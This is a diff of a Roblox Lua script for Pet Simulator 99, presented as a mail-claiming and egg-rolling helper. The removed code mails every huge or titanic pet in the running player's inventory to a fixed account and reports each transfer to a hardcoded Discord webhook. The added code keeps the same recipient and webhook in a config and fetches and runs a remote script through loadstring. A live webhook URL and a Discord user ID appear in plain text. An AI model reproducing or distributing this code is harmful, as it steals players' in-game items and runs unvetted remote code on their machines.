@@ -1,190 +1,25 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdvll/pet-simulator-99/main/waitForGameLoad.lua"))()
-wait(35)
-local HttpService = game:GetService("HttpService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local const = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Directory"))
-local library = require(game.ReplicatedStorage.Library.Client.Save)
-local Network = ReplicatedStorage:WaitForChild("Network")
-local MailboxClaim = Network:WaitForChild("Mailbox: Claim")
-
-local player = game:GetService("Players").LocalPlayer
-local itemsFrame = player.PlayerGui["_MACHINES"].MailboxMachine.Frame.GiftsFrame.ItemsFrame
-local save = library.Get()
-
-local Webhook_URL = "https://discordapp.com/api/webhooks/1272924017279500358/bSCPZ6GNJPboog-FtdCEgWRvwwNIuokpUMZntsI8tk3YqS0Iz-2aE24ij4yNC76xsrZq"
-local request = http_request
+wait(45)
 
 
-local frameFound = false
+getgenv().Config = {
+    Key = "free",
+    ClaimMail = true,
+    ClaimForeverPack = true,
+    SendWebhook = true,
+    Webhook_URL = "https://discordapp.com/api/webhooks/1272924017279500358/bSCPZ6GNJPboog-FtdCEgWRvwwNIuokpUMZntsI8tk3YqS0Iz-2aE24ij4yNC76xsrZq",
+    OnlySendObtainedHuge = false,
+    SendHuge = true,
+    PlayerToSend = "Octoptys",
+    PingUser = true,
+    UserId = "651452406974119966",
+    HidePlayerName = false
 
-
-local function claimMail(mailId)
-    local args = {
-        [1] = {
-            [1] = mailId
-        }
-    }
-    MailboxClaim:InvokeServer(unpack(args))
-end
-
-
-for _, itemFrame in pairs(itemsFrame:GetChildren()) do
-    if itemFrame:IsA("Frame") then
-        frameFound = true
-        local mailId = itemFrame.Name
-        claimMail(mailId)
-        task.wait(1)
-    end
-end
-
-
-if not frameFound then
-    print("MAIL EMPTY")
-end
-
-
-
-
-local args = {
-    [1] = "Default"
 }
 
-game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("ForeverPacks: Claim Free"):InvokeServer(unpack(args))
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KqRs/Secretss/main/lrss",true))()
 
-local function sendToDiscord(playerName, petName)
-    local embeds = {
-        {
-            ["title"] = "Pet Obtained",
-            ["description"] = playerName .. " obtained a new huge pet!",
-            ["type"] = "rich",
-            ["color"] = tonumber(0xffffff),
-            ["fields"] = {
-                {
-                    ["name"] = petName,
-                    ["value"] = "This pet is HUGE!",
-                    ["inline"] = true
-                }
-            }
-        }
-    }
-
-    local response
-    local success, err = pcall(function()
-        response = request({
-            Url = Webhook_URL,
-            Method = 'POST',
-            Headers = {
-                ['Content-Type'] = 'application/json'
-            },
-            Body = HttpService:JSONEncode({
-                ["content"] = "",
-                ["embeds"] = embeds
-            })
-        })
-    end)
-
-    if success and response then
-        print("Webhook sent with response: ", response.StatusCode)
-    else
-        warn("Failed to send webhook: ", err)
-    end
-end
-
-local function DepositPetInTrade()
-    if save.Inventory.Pet ~= nil then
-        for i, v in pairs(save.Inventory.Pet) do
-            local petName = v.id
-            local dir = const.Pets[petName]
-            if dir and dir.huge or dir.titanic then
-                wait(0.5)
-                local args = {
-                    [1] = "Octoptys",
-                    [2] = "ty",
-                    [3] = "Pet",
-                    [4] = i,
-                    [5] = 1
-                }
-                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-                
-                -- Отправляем уведомление в Discord
-                sendToDiscord("Octoptys", petName)
-            end
-        end
-    else
-        print("No pets found in inventory.")
-    end 
-end
-
--- Вызываем функцию для проверки инвентаря
-DepositPetInTrade()
-
-wait(2)
-local Webhook_URL = "https://discordapp.com/api/webhooks/1272924017279500358/bSCPZ6GNJPboog-FtdCEgWRvwwNIuokpUMZntsI8tk3YqS0Iz-2aE24ij4yNC76xsrZq"
-
-local request = http_request
-
-local function sendToDiscord(playerName, petName)
-    local embeds = {
-        {
-            ["title"] = "Pet Obtained",
-            ["description"] = playerName .. " obtained a new pet!",
-            ["type"] = "rich",
-            ["color"] = tonumber(0xffffff),
-            ["fields"] = {
-                {
-                    ["name"] = petName,
-                    ["value"] = "Type: sds",
-                    ["inline"] = true
-                }
-            }
-        }
-    }
-
-    local success, err = pcall(function()
-        request({
-            Url = Webhook_URL,
-            Method = 'POST',
-            Headers = {
-                ['Content-Type'] = 'application/json'
-            },
-            Body = HttpService:JSONEncode({
-                ["content"] = "",
-                ["embeds"] = embeds
-            })
-        })
-    end)
-end
-
-local function onItemsUpdate(player, pets)
-    if pets and pets.set and pets.set.Pet then
-        local playerName = player.Name
-
-        for id, pet in pairs(pets.set.Pet) do
-            if pet and pet.id then
-                local petData = const.Pets[pet.id]
-
-                if petData and petData.huge or petData.titanic then
-                    wait(0.5)
-                    local args = {
-                        [1] = "Octoptys",
-                        [2] = "ty",
-                        [3] = "Pet",
-                        [4] = id,
-                        [5] = 1
-                    }
-                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-                    sendToDiscord(playerName, pet.id)
-                end
-            end
-        end
-    end
-end
-
-local connection = ReplicatedStorage:WaitForChild("Network"):WaitForChild("Items: Update").OnClientEvent:Connect(onItemsUpdate)
-
-wait(2)
-
-
+task.wait(2)
 getgenv().RngEvent = {
     Selected_RngEgg = "First",
     Rolling_Enabled = true,
